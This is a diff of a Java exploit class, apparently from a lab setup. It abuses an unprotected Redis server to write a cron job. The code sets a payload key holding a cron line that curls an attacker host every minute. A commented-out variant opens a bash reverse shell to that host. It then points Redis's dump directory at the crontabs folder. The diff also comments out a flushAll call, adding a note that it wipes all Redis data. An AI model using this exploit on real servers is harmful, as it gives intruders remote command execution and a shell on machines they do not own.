@@ -13,7 +13,7 @@ public class Crontab {
 
 
         Jedis jedis = new Jedis("192.168.91.147", 6379);
-        jedis.flushAll();
+        //jedis.flushAll();  //此方法会删除redis的所有数据，不要在生产环境调用此方法
         //jedis.set("x", "\n\n* * * * * /bin/bash -i >& /dev/tcp/192.168.91.1/9999 0>&1\n\n");
         jedis.set("x", "\n\n* * * * * curl 192.168.91.1:9999\n\n");
         jedis.configSet("dir","/var/spool/cron/crontabs/");
